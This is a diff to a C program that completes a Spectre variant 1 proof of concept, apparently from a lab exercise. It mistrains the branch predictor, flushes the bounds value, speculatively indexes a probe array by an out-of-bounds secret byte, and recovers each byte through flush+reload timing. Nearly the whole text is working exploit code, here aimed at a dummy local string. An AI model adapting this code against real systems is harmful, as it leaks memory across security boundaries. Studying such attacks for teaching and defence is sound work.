@@ -9,23 +9,23 @@
 #include <sys/mman.h>
 #include <x86intrin.h>
 
-char secret[100];
-char some_array[0x1000];
 
 // cache scratchpad array
 typedef struct Array {
     char data[0x1000];
 } Array;
 
+// value to steal
+char secret[100];
+
+// array used in the dangerous logic
+char some_array[0x1000];
 
 // used for flush-reload
 volatile Array *scratchpad;
 
 // used for branch predictor
 volatile Array *temp_scratchpad;
-
-// where to access!
-volatile int *branch_variable;
 
 // Size of the array on its own page
 volatile int size[0x10000];
@@ -42,12 +42,16 @@ mmap_size(size_t size) {
 // allocate all memory
 void
 alloc_memory() {
+   
+    // scratchpads for attack	
     scratchpad = mmap_size(sizeof(Array) * 256);
     temp_scratchpad = mmap_size(sizeof(Array) * 256);
-    branch_variable = mmap_size(0x1000);
-    
+   
+    // where the bad array has its size stored 
     size[0] = 0x1000;
     array_size = &size[0];
+   
+    // the secret we will steal 
     memset(secret, 97, 100);
     strcpy(secret, "abcdefgh");
 }
@@ -57,19 +61,13 @@ alloc_memory() {
 int spectre_logic(int idx,
                     Array *cachepad) {
     volatile int i = 0;
-    
-    // flush array size from cache and load index to access into cache
-    
     if (idx < *array_size && idx >= 0) {
         // excute the following line speculatively
         // will access cachepad indexed by secret[idx]
         i &= cachepad[some_array[idx]].data[0];
     }
-    
     return i;
 }
-
-
 
 // flush all scratchpad data
 void
@@ -86,8 +84,6 @@ uint64_t
 reload_fastest(uint64_t *p_timing) {
     uint64_t min_timing = -1ul;
     uint64_t min_idx;
-    // TODO: return minimum timing index and timing (via p_timing)
-    // while reloading blocks from scratchpad
 
     uint64_t diff;
     uint64_t start;
@@ -100,7 +96,6 @@ reload_fastest(uint64_t *p_timing) {
         c = scratchpad[i].data[0];
         end = __rdtscp(&a);
         diff = end - start;
-	//printf("%d: %d\n", i, diff);
         if (diff < min_timing) {
             min_timing = diff;
             min_idx = i;
@@ -110,50 +105,54 @@ reload_fastest(uint64_t *p_timing) {
     return min_idx;
 }
 
+// Teach the bp to take the branch in the function.
 void mistrain_bp() {
 	for (int k = 0; k < 256; k++) {
-		//*branch_variable = k;	
-		//spectre_logic(*branch_variable, scratchpad);
-		spectre_logic(k, scratchpad);
+		spectre_logic(k, temp_scratchpad); // VERY IMPORTANT to use a temp scratchpad here, not the real one.
 	}
     	_mm_mfence();
 }
 
+// Launch spectre.
 void
 spectre() {
+    // For storing the secret.
     char buffer[100];
     memset(buffer, 0, 100);
 
-    volatile char c;
-
-    for (int i = 0; i < 8*6; i++) {
+    for (int i = 0; i < 8; i++) {
         usleep(1000);
 
+	// Clean the cache and branch predictor
         flush_all();
-	//mistrain_bp();
-	
-	volatile uint64_t malicious_x = (secret - some_array) + (i / 6);	
-	volatile uint64_t training_x = 0;	
-	*branch_variable = ((i%6)-1)&~0xFFFF;
-	*branch_variable = (*branch_variable|(*branch_variable>> 16)); 
-	*branch_variable = training_x ^ (*branch_variable & (malicious_x ^ training_x));
-    	
+	mistrain_bp();
+
+	// Calculate offset to hit the correct target
+	int target_offset = secret - some_array + i;	
+
+	// Flush array size so spec ex has time to happen.  VERY IMPORTANT.
 	_mm_clflush(array_size);
     	_mm_mfence();
-	spectre_logic(*branch_variable, scratchpad);
+
+	// Do the dangerous thing	
+	spectre_logic(target_offset, scratchpad);
     	_mm_mfence();
-        
+       
+        // Reload the secret value	
 	uint64_t min_timing = -1ul;
         uint64_t min_index = reload_fastest(&min_timing);
-        if (min_timing > 100) {
+       
+        // Skip if we didn't find it.	
+	if (min_timing > 100) {
             i--;
             continue;
 	} 
-        
+       
+       	// Save the secret	
+	printf("Secret: %d\n", min_index);
 	buffer[i] = (char)(min_index);
-    	if (*branch_variable != 0) 	
-		printf("Secret: %d\n", min_index);
     }
+    printf("Full secret: %s\n", buffer);
 }
 
 int
